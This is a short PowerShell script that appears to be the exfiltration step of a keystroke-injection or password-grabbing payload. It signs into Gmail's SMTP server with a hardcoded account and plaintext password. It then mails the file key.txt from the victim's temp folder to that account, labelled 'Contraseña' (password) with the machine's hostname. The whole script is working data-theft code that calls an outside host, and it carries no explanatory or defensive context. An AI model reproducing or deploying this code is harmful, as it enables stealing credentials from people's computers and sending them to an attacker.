$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('correrorubber@gmail.com', 'Cisco123')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'correrorubber@gmail.com'
$ReportEmail.To.Add('correrorubber@gmail.com')
$ReportEmail.Subject = 'Contraseña - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
$ReportEmail.Attachments.Add("$ENV:temp\key.txt")
$SMTPInfo.Send($ReportEmail)
